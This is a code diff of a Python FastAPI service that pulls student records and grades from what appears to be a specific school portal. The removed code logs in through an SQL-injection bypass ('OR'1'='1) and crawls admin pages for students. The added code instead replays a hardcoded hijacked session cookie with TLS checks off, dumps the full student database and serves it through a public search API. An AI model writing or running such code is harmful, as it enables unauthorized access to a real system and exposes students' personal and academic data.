@@ -1,127 +1,116 @@
 import os
 import re
-import requests
+import asyncio
+import httpx
+from fastapi import FastAPI, BackgroundTasks, HTTPException
+from fastapi.responses import HTMLResponse
 from bs4 import BeautifulSoup
-from fastapi import FastAPI, BackgroundTasks, HTTPException, Query
-from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import HTMLResponse, JSONResponse
-from fastapi.staticfiles import StaticFiles
 
 app = FastAPI()
 
-# Enable CORS
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+# Configuration
+DB_FILE = "students.txt"
+PORTAL_IP = "82.25.125.30"
+# Session ID from your Termux test
+SESSION_ID = "a91h1f0n33i73qucmloitsauc5"
 
-# Configuration - Now expecting index.html at ROOT
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-DB_FILE = os.path.join(BASE_DIR, "organized_students.txt")
-SECRET_SYNC_KEY = "SHADOW_SYNC_2026"
-BASE_URL = "https://ccsjdm.com/student_portal/gs"
+# RAM Cache for fast searching on Render
+STUDENT_CACHE = []
 
-# We still mount /static for the logo/CSS, but the HTML is at root
-if not os.path.exists(os.path.join(BASE_DIR, "static")):
-    os.makedirs(os.path.join(BASE_DIR, "static"))
-
-app.mount("/static", StaticFiles(directory=os.path.join(BASE_DIR, "static")), name="static")
-
-def get_portal_session():
-    """Bypasses portal login using SQLi."""
-    s = requests.Session()
-    s.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-    })
-    auth_url = f"{BASE_URL}/login.php?id='OR'1'='1&pass='OR'1'='1"
-    try:
-        s.get(auth_url, timeout=15)
-        return s if s.cookies.get('PHPSESSID') else None
-    except:
-        return None
-
-def sync_students_task():
-    """Background task to crawl the portal."""
-    session = get_portal_session()
-    if not session: return
+def parse_student_dump():
+    """Parses the raw text dump into a searchable list."""
+    global STUDENT_CACHE
+    if not os.path.exists(DB_FILE):
+        return
     
-    master_list = []
-    for char in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
-        try:
-            resp = session.get(f"{BASE_URL}/admin-portal/view_students.php?search={char}", timeout=20)
-            soup = BeautifulSoup(resp.text, 'html.parser')
-            rows = soup.find_all('tr', class_='hover:bg-gray-50')
-            for row in rows:
-                cols = row.find_all('td')
-                if len(cols) >= 4:
-                    data = f"studentID:{cols[0].text.strip()},name:{cols[1].text.strip()},cys:{cols[2].text.strip()},status:{cols[3].text.strip()}"
-                    master_list.append(data)
-        except: continue
+    with open(DB_FILE, "r") as f:
+        data = f.read()
+    
+    # Regex matching the specific format in your students.txt
+    pattern = r"studentID:(.*?),name:(.*?),cys:(.*?),status:(.*?)(?=\n|studentID:|$)"
+    matches = re.findall(pattern, data)
+    
+    STUDENT_CACHE = [
+        {"id": m[0].strip(), "name": m[1].strip(), "cys": m[2].strip(), "status": m[3].strip()}
+        for m in matches
+    ]
 
-    if master_list:
-        with open(DB_FILE, "w", encoding="utf-8") as f:
-            f.write("\n".join(master_list))
-
-# --- ROUTES ---
-
-@app.get("/", response_class=HTMLResponse)
-async def read_index():
-    """Serves index.html from the ROOT directory."""
-    index_path = os.path.join(BASE_DIR, "index.html")
-    try:
-        if os.path.exists(index_path):
-            with open(index_path, "r", encoding="utf-8") as f:
-                return f.read()
-        return f"<h1>Error: index.html not found at {index_path}</h1>"
-    except Exception as e:
-        return f"<h1>Server Error: {str(e)}</h1>"
-
-@app.get("/api/status")
-async def system_status():
-    return {
-        "status": "Shadow Engine Online",
-        "db_initialized": os.path.exists(DB_FILE),
-        "db_size": os.path.getsize(DB_FILE) if os.path.exists(DB_FILE) else 0
-    }
-
-@app.get("/api/sync")
-async def trigger_sync(background_tasks: BackgroundTasks, key: str = None):
-    if key != SECRET_SYNC_KEY:
-        raise HTTPException(status_code=403, detail="Unauthorized")
-    background_tasks.add_task(sync_students_task)
-    return {"message": "Sync initiated."}
+@app.on_event("startup")
+async def startup():
+    parse_student_dump()
 
 @app.get("/api/search")
-async def search_students(q: str = Query(..., min_length=2)):
-    if not os.path.exists(DB_FILE):
-        return {"results": [], "error": "DB not ready"}
+async def search(q: str = ""):
     query = q.upper()
-    with open(DB_FILE, "r", encoding="utf-8") as f:
-        matches = [line.strip() for line in f if query in line.upper()]
-        return {"results": matches[:20]}
+    # Returns top 26 matches to stay within limits
+    return [s for s in STUDENT_CACHE if query in s['name'] or query in s['id']][:26]
 
-@app.get("/api/grades/{student_id}")
-async def get_grades(student_id: str):
-    session = get_portal_session()
-    if not session: raise HTTPException(status_code=500)
-    try:
-        resp = session.get(f"{BASE_URL}/admin-portal/view_student_grades.php?id={student_id}", timeout=15)
-        soup = BeautifulSoup(resp.text, 'html.parser')
+@app.post("/api/sync")
+async def sync_db(background_tasks: BackgroundTasks):
+    """Triggers the full database dump."""
+    async def do_sync():
+        url = f"https://{PORTAL_IP}/gs/admin-portal/AjaxPHPfiles/students.php?allStudentData=true&buttonSelected=overall"
+        headers = {"Host": "sb.ccsjdm.com", "User-Agent": "Mozilla/6.0"}
+        cookies = {"PHPSESSID": SESSION_ID}
+        
+        async with httpx.AsyncClient(verify=False) as client:
+            try:
+                r = await client.get(url, headers=headers, cookies=cookies, timeout=6.0)
+                if r.status_code == 200:
+                    with open(DB_FILE, "w") as f:
+                        f.write(r.text)
+                    parse_student_dump()
+            except Exception:
+                pass
+
+    background_tasks.add_task(do_sync)
+    return {"message": "Syncing database..."}
+
+@app.get("/api/grades/{sid}")
+async def get_grades(sid: str):
+    """Scrapes multiple semesters using index-based column parsing."""
+    url = f"https://{PORTAL_IP}/gs/admin-portal/view_student_grades.php?id={sid}"
+    headers = {"Host": "sb.ccsjdm.com"}
+    cookies = {"PHPSESSID": SESSION_ID}
+
+    async with httpx.AsyncClient(verify=False) as client:
+        r = await client.get(url, headers=headers, cookies=cookies, timeout=6.0)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        
+        results = []
+        # Find all table sections
         tables = soup.find_all('table')
-        transcript = []
         for table in tables:
-            if not table.find('div', class_='subject-code'): continue
-            sem_info = {"term": "Academic Record", "subjects": [], "gwa": "0.00"}
-            rows = table.find_all('tr', class_='hover:bg-gray-50')
+            caption = table.find('caption')
+            semester = caption.get_text(strip=True) if caption else "Unknown"
+            
+            # Find the Year Header (H2) preceding the table
+            year_header = table.find_previous('h2')
+            year = year_header.get_text(strip=True) if year_header else ""
+
+            subjects = []
+            rows = table.find_all('tr', class_='bg-white border')
             for row in rows:
-                cols = row.find_all('td')
-                sem_info["subjects"].append({
-                    "code": row.select_one('.subject-code').text.strip(),
-                    "description": row.select_one('.subject-desc').text.strip(),
-                    "grade": row.select_one('.grade-badge').text.strip() if row.select_one('.grade-badge') else "-"
-                })
-            transcript.append(sem_info)
-        return {"transcript": transcript}
-    except: raise HTTPException(status_code=500)
+                cols = row.find_all(['th', 'td'])
+                
+                # Grade Data Row (Matches your imissyou.txt structure)
+                if len(cols) >= 7:
+                    subjects.append({
+                        "code": cols[0].get_text(strip=True),
+                        "desc": cols[1].get_text(strip=True),
+                        "prof": cols[3].get_text(strip=True),
+                        "mid": cols[4].get_text(strip=True),  # 9x.xx
+                        "fin": cols[5].get_text(strip=True),  # 9x.xx
+                        "gwa": cols[6].get_text(strip=True)   # 1.xx
+                    })
+                
+                # Total Semester GWA Row
+                elif "Total Final Grade" in row.get_text():
+                    summary_gwa = cols[-1].get_text(strip=True)
+                    results.append({
+                        "year": year,
+                        "semester": semester,
+                        "data": subjects,
+                        "total_gwa": summary_gwa
+                    })
+        return results
